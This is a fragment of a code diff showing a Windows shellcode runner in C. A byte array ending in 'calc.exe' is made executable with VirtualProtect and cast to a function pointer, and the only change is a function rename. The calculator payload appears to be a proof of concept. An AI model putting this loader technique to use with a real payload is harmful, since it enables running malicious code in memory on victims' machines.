@@ -17,7 +17,7 @@ char shellcode[] = {
     "\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
     "\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 };
-void startShellcode(){
+void startShellCode(){
     DWORD oldProtect;
     VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
     int (*shellcodefunc)() = (int(*)())(void*)shellcode;
